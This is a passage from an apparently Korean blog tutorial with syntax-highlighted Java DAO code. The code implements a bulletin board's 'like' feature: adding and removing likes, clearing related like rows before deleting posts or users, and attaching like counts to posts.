<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">finally</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">Close</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="n">cnt</span> <span class="o">==</span> <span class="mi">1</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>테이블에 <code class="language-plaintext highlighter-rouge">좋아요</code> 클릭 여부를 추가하거나 삭제한다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err"> </span> <span class="err"> </span> <span class="c1">// 사용자 게시글 좋아요 추가하기.</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="kt">void</span> <span class="nf">addLike</span><span class="o">(</span><span class="kt">long</span> <span class="n">userSid</span><span class="o">,</span> <span class="kt">long</span> <span class="n">noticeSid</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">query</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"insert into "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">tableName</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" (user_sid, notice_board_sid) values (?, ?)"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">Connection</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">pstmt</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">query</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setLong</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">userSid</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setLong</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="n">noticeSid</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">executeUpdate</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">finally</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">Close</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="c1">// 사용자 게시글 좋아요 삭제하기.</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="kt">void</span> <span class="nf">deleteLike</span><span class="o">(</span><span class="kt">long</span> <span class="n">userSid</span><span class="o">,</span><span class="kt">long</span> <span class="n">noticeSid</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">query</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"delete from "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">tableName</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where user_sid=? and notice_board_sid=?"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">Connection</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">pstmt</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">query</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setLong</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">userSid</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setLong</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="n">noticeSid</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">executeUpdate</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">finally</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">Close</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>게시글을 삭제할 때 <code class="language-plaintext highlighter-rouge">좋아요</code> 테이블에서 게시글과 관련된 정보들을 먼저 삭제해야한다. 먼저 삭제하지 않으면 무결성 위배 오류가 발생한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/110dca23-377e-4d31-87b5-af9a1ee51ce4" alt="Pasted image 20230603155100" /></li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err"> </span> <span class="err"> </span> <span class="c1">// 게시글 삭제할 때 좋아요 테이블에서 게시글과 관련된 데이터 모두 지우기.</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="kt">void</span> <span class="nf">deleteNoticeLike</span><span class="o">(</span><span class="kt">long</span> <span class="n">noticeSid</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">query</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"delete from "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">tableName</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where notice_board_sid=?"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">Connection</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">pstmt</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">query</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setLong</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">noticeSid</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">executeUpdate</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">finally</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">Close</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>마찬가지로 사용자 계정을 삭제할 때도 먼저 <code class="language-plaintext highlighter-rouge">좋아요</code> 테이블에서 사용자와 관련된 정보를 삭제해야한다. 먼저 삭제안하면 무결성 위배 오류가 발생한다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err"> </span> <span class="err"> </span> <span class="c1">// 사용자가 탈퇴할 때 좋아요 테이블에서 사용자와 관련된 데이터 모두 지우기.</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="kt">void</span> <span class="nf">deleteUserLike</span><span class="o">(</span><span class="kt">long</span> <span class="n">userSid</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">query</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"delete from "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">tableName</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where user_sid=?"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">Connection</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">pstmt</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">query</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setLong</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">userSid</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">executeUpdate</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">finally</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">Close</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
</code></pre></div></div>

<h4 id="noticejava">Notice.java</h4>
<ul>
  <li><code class="language-plaintext highlighter-rouge">좋아요</code> 수를 저장하기 위한 변수를 만들어준다.</li>
  <li><code class="language-plaintext highlighter-rouge">좋아요</code> 수 변수를 읽기 위한 함수역시 만들어 준다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Notice</span> <span class="o">{</span>
<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">private</span> <span class="kt">long</span> <span class="n">likes</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="nf">Notice</span><span class="o">(</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">long</span> <span class="n">sid</span><span class="o">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">long</span> <span class="n">userSID</span><span class="o">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">String</span> <span class="n">username</span><span class="o">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">long</span> <span class="n">genTime</span><span class="o">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">String</span> <span class="n">title</span><span class="o">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">String</span> <span class="n">mainText</span><span class="o">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">long</span> <span class="n">views</span><span class="o">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">long</span> <span class="n">likes</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">this</span><span class="o">.</span><span class="na">likes</span> <span class="o">=</span> <span class="n">likes</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="kt">long</span> <span class="nf">getLikes</span><span class="o">(){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="n">likes</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
</code></pre></div></div>

<h4 id="noticeboarddaojava">NoticeBoardDAO.java</h4>
<ul>
  <li>게시글을 삭제할 때 먼저 <code class="language-plaintext highlighter-rouge">좋아요</code> 테이블에서 게시글과 관련된 정보를 삭제한다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">NoticeBoardDAO</span> <span class="o">{</span>
<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span> 
<span class="err"> </span> <span class="err"> </span> <span class="c1">// 삭제</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">deleteNotice</span><span class="o">(</span><span class="kt">long</span> <span class="n">sid</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 좋아요 테이블에서 게시글과 관련된 좋아요 기록 모두 삭제</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">new</span> <span class="nc">NoticeLikeDAO</span><span class="o">(</span><span class="n">context</span><span class="o">).</span><span class="na">deleteNoticeLike</span><span class="o">(</span><span class="n">sid</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>게시글들을 읽어올 때나 게시글 하나를 읽어올 때 <code class="language-plaintext highlighter-rouge">좋아요</code> 수를 구해서 게시글 클래스에 저장하여준다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="nc">Notice</span> <span class="nf">getNotice</span><span class="o">(</span><span class="kt">long</span> <span class="n">sid</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">result</span><span class="o">.</span><span class="na">next</span><span class="o">()){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">noticeSid</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="na">getLong</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">long</span> <span class="n">likes</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NoticeLikeDAO</span><span class="o">(</span><span class="n">context</span><span class="o">).</span><span class="na">getCount</span><span class="o">(</span><span class="n">noticeSid</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">notice</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Notice</span><span class="o">(</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">noticeSid</span><span class="o">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">result</span><span class="o">.</span><span class="na">getLong</span><span class="o">(</span><span class="mi">2</span><span class="o">),</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">result</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">3</span><span class="o">),</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">result</span><span class="o">.</span><span class="na">getLong</span><span class="o">(</span><span class="mi">4</span><span class="o">),</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">result</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">5</span><span class="o">),</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">result</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">6</span><span class="o">),</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">result</span><span class="o">.</span><span class="na">getLong</span><span class="o">(</span><span class="mi">7</span><span class="o">),</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">likes</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">Notice</span><span class="o">&gt;</span> <span class="nf">getNoticeList</span><span class="o">(</span><span class="kt">int</span> <span class="n">optionVal</span><span class="o">,</span><span class="nc">String</span> <span class="n">question</span><span class="o">,</span> <span class="kt">int</span> <span class="n">start</span><span class="o">,</span> <span class="kt">int</span> <span class="n">number</span><span class="o">,</span> <span class="kt">long</span> <span class="n">from</span><span class="o">,</span> <span class="kt">long</span> <span class="n">to</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">while</span><span class="o">(</span><span class="n">result</span><span class="o">.</span><span class="na">next</span><span class="o">()){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">noticeSid</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="na">getLong</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">long</span> <span class="n">likes</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NoticeLikeDAO</span><span class="o">(</span><span class="n">context</span><span class="o">).</span><span class="na">getCount</span><span class="o">(</span><span class="n">noticeSid</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">mainText</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">6</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">notice</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Notice</span><span class="o">(</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">noticeSid</span><span class="o">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">result</span><span class="o">.</span><span class="na">getLong</span><span class="o">(</span><span class="mi">2</span><span class="o">),</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">result</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">3</span><span class="o">),</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">result</span><span class="o">.</span><span class="na">getLong</span><span class="o">(</span><span class="mi">4</span><span class="o">),</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">result</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">5</span><span class="o">),</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">mainText</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="o">(</span><span class="n">mainText</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&lt;</span> <span class="n">maxLen</span><span class="o">)?</span><span class="n">mainText</span><span class="o">.</span><span class="na">length</span><span class="o">():</span><span class="n">maxLen</span><span class="o">),</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">result</span><span class="o">.</span><span class="na">getLong</span><span class="o">(</span><span class="mi">7</span><span class="o">),</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">likes</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">);</span>
